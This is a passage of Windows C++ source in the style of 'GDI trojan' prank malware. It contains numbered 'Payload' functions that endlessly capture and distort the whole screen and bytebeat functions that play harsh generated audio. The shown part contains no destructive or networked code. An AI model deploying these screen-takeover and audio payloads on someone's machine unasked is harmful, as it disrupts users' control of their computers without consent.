		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		Rotation(hdc, rand() % 360, { rand() % w,rand() % h });
		AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blend);
		Sleep(153);
		ReleaseDC(0, hdc);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload8_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN), i = 0;
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpCopy = SelectObject(hdcCopy, bmp);
	srand(time(NULL));
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;
				int fx = (int)(fabs(x + round(cosf(ceil(y + (i * 10)) / 50)) * 1000) - fabs(y + round(sinf(ceil(x - (i * 10)) / 50)) * 1000)) / 3;
				double fxcopy = (fx + (((x + (i * 5)) & y) / 3));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = (FLOAT)fmod((DOUBLE)hslcolor.h + fxcopy / 15000.0 + 0.09, 1.0);
				hslcolor.s = 1.00000000000000005033f;
				if (hslcolor.l < .5f) { hslcolor.l += .5f; }
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		SelectObject(hdcCopy, bmpCopy);
		ReleaseDC(NULL, hdc);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload8_num2(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), blocksize = 100;
	HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hdcCopy, bmp);
	BLENDFUNCTION blend = { AC_SRC_OVER, 0, 80, 0 };
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		int luckynum = 1 + rand() % 10;
		DWORD rop = NULL;
		if (luckynum == 1) { rop = PATCOPY; }
		else if (luckynum == 2) { rop = PATPAINT; }
		else if (luckynum == 3) { rop = SRCINVERT; }
		else if (luckynum == 4) { rop = SRCCOPY; }
		else if (luckynum == 5) { rop = NOTSRCCOPY; }
		else if (luckynum == 6) { rop = NOTSRCERASE; }
		else if (luckynum == 7) { rop = RGBBRUSH; }
		else if (luckynum == 8) { rop = SRCBRUSH; }
		else if (luckynum == 9) { rop = MERGECOPY; }
		else if (luckynum == 10) { rop = PATINVERT; }
		for (int x = 0; x <= w; x += blocksize) {
			for (int y = 0; y <= h; y += blocksize) {
				int rndx = x + (-5 + rand() % 50), rndy = y + (-5 + rand() % 50), rndx2 = x + (-5 + rand() % 50), rndy2 = y + (-5 + rand() % 50);
				HBRUSH hbrush = CreateHatchBrush(rand() % 7, RndRGB);
				HGDIOBJ hbrushCopy = SelectObject(hdcCopy, hbrush);
				StretchBlt(hdcCopy, rndx, rndy, blocksize, blocksize, hdcCopy, rndx2, rndy2, blocksize, blocksize, rop);
				SelectObject(hdcCopy, hbrushCopy);
				DeleteObject(hbrush);
			}
		}
		AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blend);
		ReleaseDC(0, hdc);
		Sleep(100);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload9_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN), frame = 0;
	PRGBTRIPLE rgbtriple;
	BITMAPINFO bmi = { sizeof(BITMAPINFOHEADER), w, -h, 1, 24, BI_RGB };
	HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbtriple, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpCopy = SelectObject(hdcCopy, bmp);
	srand(time(NULL));
	COLORREF rainbowColors[] = { RGB(41, 53, 121), RGB(236, 129, 228), RGB(201, 227, 68), RGB(81, 117, 68), RGB(62, 49, 53), RGB(207, 17, 125), RGB(10, 27, 181) };
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < w * h; i++) {
			int x = i / w, y = i % w;
			int t = (x ^ y & (x + y)) - frame, colorIndex = (t / 50) % 7;
			rgbtriple[i].rgbtRed += GetRValue(rainbowColors[colorIndex]);
			rgbtriple[i].rgbtGreen += GetGValue(rainbowColors[colorIndex]);
			rgbtriple[i].rgbtBlue += GetBValue(rainbowColors[colorIndex]);
		}
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		SelectObject(hdcCopy, bmpCopy);
		ReleaseDC(NULL, hdc);
		Sleep(10);
		frame += 25;
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0x00;
}
DWORD WINAPI Payload9_num2(LPVOID lpParam)
{
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), radius = 48, numCircles = (h / (radius + 4.5f)) * radius, count = 0;
	double chushi = 1.f;
	HDC hdc = GetDC(NULL);
	HINSTANCE HSHELL32 = LoadLibrary(_T("Shell32.dll")), HIMAGERES = LoadLibrary(_T("Imageres.dll")), HMORICONS = LoadLibrary(_T("Moricons.dll")), HPIFMGR = LoadLibrary(_T("Pifmgr.dll")), HIEFRAME = LoadLibrary(_T("ieframe.dll"));
	while (true)
	{
		for (int i = 0; i < numCircles; i++) {
			int spiralRadius = i * chushi, x = ((w / 2) + radius) + spiralRadius * cos(i * 1.2f), y = ((h / 2) + radius) + spiralRadius * tan(i * 1.2f);
			hdc = GetDC(0);
			HICON load[11] = { LoadIcon(HSHELL32, MAKEINTRESOURCE(1 + rand() % 336)),LoadIcon(HIMAGERES,MAKEINTRESOURCE(1 + (rand() % 365))),LoadIcon(NULL,MAKEINTRESOURCE(32512 + (rand() % 7))),LoadIcon(HMORICONS,MAKEINTRESOURCE(1 + (rand() % 38))),LoadIcon(HPIFMGR,MAKEINTRESOURCE(1 + (rand() % 113))),LoadCursor(NULL,MAKEINTRESOURCE(101 + rand() % 18)) ,LoadCursor(NULL,MAKEINTRESOURCE(32640 + rand() % 30)) ,LoadCursor(NULL,MAKEINTRESOURCE(32512 * rand() % 5)), LoadCursor(NULL,MAKEINTRESOURCE(32631)), LoadIcon(GetModuleHandleA(0), MAKEINTRESOURCE(107)),LoadIcon(HIEFRAME, MAKEINTRESOURCE(1 + (rand() % 336))) };
			DrawIconEx(hdc, x, y, load[rand() % 11], 36, 36, NULL, NULL, DI_NORMAL);
			ReleaseDC(0, hdc);
			if (count == 10) {
				count = 0;
				Sleep(1);
			}
			else { count++; }
		}
		if (chushi > 2.5f) { chushi = 1.f; }
		else { chushi = chushi + 0.1f; }
		Sleep(100);
	}
	return 0;
}
DWORD WINAPI Payload10_num1(LPVOID lpParam)//credits to camellia-y7x for the base
{
	HDC hdc = GetDC(0), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, -h, 1, 32 };
	HBITMAP bmp = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpCopy = SelectObject(hdcCopy, bmp);
	srand(time(NULL));
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < w * h; i++) {
			int x = i * w, y = i / h, code = (x ^ y) - i;
			rgbScreen[i].rgb &= ((code >> code) | -(code << code)) & ((code * code) - (~(code ^ code)));
		}
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		SelectObject(hdcCopy, bmpCopy);
		ReleaseDC(NULL, hdc);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0x00;
}
DWORD WINAPI Payload10_num2(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hdcCopy, bmp);
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int x = 0; x < w; x += 40) { for (int y = 0; y < h; y += 40) { StretchBlt(hdcCopy, x, y, 40, 40, hdcCopy, x, y, 25, 25, SRCCOPY); } }
		BitBlt(hdcCopy, -1, 1, w, h, hdcCopy, 2, 2, SRCAND);
		BitBlt(hdcCopy, 1, -1, w, h, hdcCopy, -2, -2, SRCPAINT);
		BitBlt(hdcCopy, rand() % 15, rand() % 15, w, h, hdcCopy, rand() % 15, rand() % 15, SRCAND);
		BitBlt(hdcCopy, rand() % 15, rand() % 15, w, h, hdcCopy, rand() % 15, rand() % 15, SRCPAINT);
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc);
		Sleep(100);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload11_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), i = 0;
	HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hdcCopy, bmp);
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		HPEN hpen = CreatePen(PS_SOLID, rand() % 10 + 1, RndRGB);
		HBRUSH hbrush = CreateSolidBrush(RndRGB);
		HGDIOBJ hpenCopy = SelectObject(hdcCopy, hpen), hbrushCopy = SelectObject(hdcCopy, hbrush);
		BitBlt(hdcCopy, 0, 0, w, h, hdcCopy, 2, 0, SRCBRUSH);
		BitBlt(hdcCopy, cos(i / 4) * 20, i * 10 % h, w, 10, hdcCopy, 0, i * 10 % h, PATINVERT);
		BitBlt(hdcCopy, i * 10 % w, tan(i / 4) * 20, 10, h, hdcCopy, i * 10 % w, 0, MERGECOPY);
		POINT vertices[5] = { {rand() % w, rand() % h}, {rand() % w, rand() % h}, {rand() % w, rand() % h}, {rand() % w, rand() % h}, {rand() % w, rand() % h} };
		Polygon(hdcCopy, vertices, 5);
		SelectObject(hdcCopy, hbrushCopy);
		SelectObject(hdcCopy, hpenCopy);
		DeleteObject(hbrush);
		DeleteObject(hpen);
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, NOTSRCERASE);
		ReleaseDC(0, hdc);
		Sleep(10);
		i++;
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload13_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN), i = 0;
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = -h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpCopy = SelectObject(hdcCopy, bmp);
	srand(time(NULL));
	double angle = .1145141919810789113f;
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;
				int cx = abs(x - (w / 3)), cy = abs(y - (h / 3));
				int zx = cos(angle) * cx - tan(angle) * cy;
				int zy = log10(angle) * cx + acos(sinf(angle)) * cy;
				double fx = ((zx ^ zy) & (zx + zy)) + i;
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = (float)fmod(hslcolor.h + fx / 16000.f + .09f, 1.f);
				hslcolor.s = 1.f;
				if (hslcolor.l <= .6666f) { hslcolor.l += .6666f; }
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		angle += .2047f;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		SelectObject(hdcCopy, bmpCopy);
		ReleaseDC(NULL, hdc);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0x00;
}
DWORD WINAPI Payload14_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), count = 5;
	HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hdcCopy, bmp);
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		int rw = rand() % w, rh = rand() % h;
		HPEN hpen = CreatePen(PS_SOLID, rand() % 10 + 1, RndRGB);
		HBRUSH hbrush = CreateSolidBrush(RndRGB);
		HGDIOBJ hpenCopy = SelectObject(hdcCopy, hpen), hbrushCopy = SelectObject(hdcCopy, hbrush);
		BitBlt(hdcCopy, rw, rand() % 15, w - rw, h, hdcCopy, rw, rand() % 15, RGBBRUSH);
		BitBlt(hdcCopy, rand() % 15, rh, w, h - rh, hdcCopy, rand() % 15, rh, RGBBRUSH);
		SetStretchBltMode(hdcCopy, COLORONCOLOR);
		StretchBlt(hdcCopy, 0, 0, w + count, h - count, hdcCopy, 0, 0, w, h, SRCCOPY);
		StretchBlt(hdcCopy, 0, 0, w - count, h + count, hdcCopy, 0, 0, w, h, SRCCOPY);
		POINT vertices[6] = { {rand() % w, rand() % h}, {rand() % w, rand() % h}, {rand() % w, rand() % h}, {rand() % w, rand() % h}, {rand() % w, rand() % h}, {rand() % w, rand() % h} };
		Polygon(hdcCopy, vertices, 6);
		SelectObject(hdcCopy, hbrushCopy);
		SelectObject(hdcCopy, hpenCopy);
		DeleteObject(hbrush);
		DeleteObject(hpen);
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc);
		Sleep(10);
		count += 5;
		if (count > 70) { count = 5; }
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
VOID WINAPI bytebeat1() {
	int nSamplesPerSec = 32768, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((t ^ t / 2) + (t * (t / 3E8))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat2() {
	int nSamplesPerSec = 16000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((((t * t >> (t >> 15)) | (t >> (((t & 31) != 0) + 3))) ^ t) - t);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat3() {
	int nSamplesPerSec = 11025, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((t >> 9 & 1 + t >> 12 & 7 ? 0 : 10001 / ((t % 4096) + 1) - t / 9 & 8 ? -1 : 0) ^ t >> 4 & (t * t >> (t >> 5 & t >> 10))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat4() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((t * ((-t % 78 * (7 - t) >> 8) & 78 * (t >> 7 | t << 8) & 78)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat5() {
	int nSamplesPerSec = 11025, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((t * ((t >> 7 | t >> 8) & 91)) ^ t) | (78 * t));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat6() {
	int nSamplesPerSec = 44100, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((128 * cos(((t * (t + 6 & t >> 13) / 26) + (-t / 169)) / 20.75) + 128));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat7() {
	int nSamplesPerSec = 22050, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((abs((t * (1 + (t >> 11) * (45 + 1 * (t >> 14 - (t >> 19) % 19) % 8) % 10) * (1 + (t >> 14) % 5)) % 256 - 128) * 199 / 100));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat8() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((trunc((cos(t ^ t >> 10) * log10(t)) - (tan(t & t >> 10)))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat9() {
	int nSamplesPerSec = 17777, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((((((666 & t * (t & t >> 13)) >> 91) + ~(666 & t * (666 & t >> 8 & t >> 3) << ((t ^ t) / 91)) ^ t + 666))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat10() {
	int nSamplesPerSec = 11025, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((t >> 16 & 1 ? 0 : t >> 10 & -t >> 14 & 3) | t >> 9 & 1 + t >> 12 & 7 ? 0 : 11451 / ((t % 4096) + 1) - t / 9 & 8 ? -1 : 0) ^ t >> 4 & ((t % 133 ^ (t >> 78 & t >> 91 | t) * t >> (78 & t >> 69))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat11() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
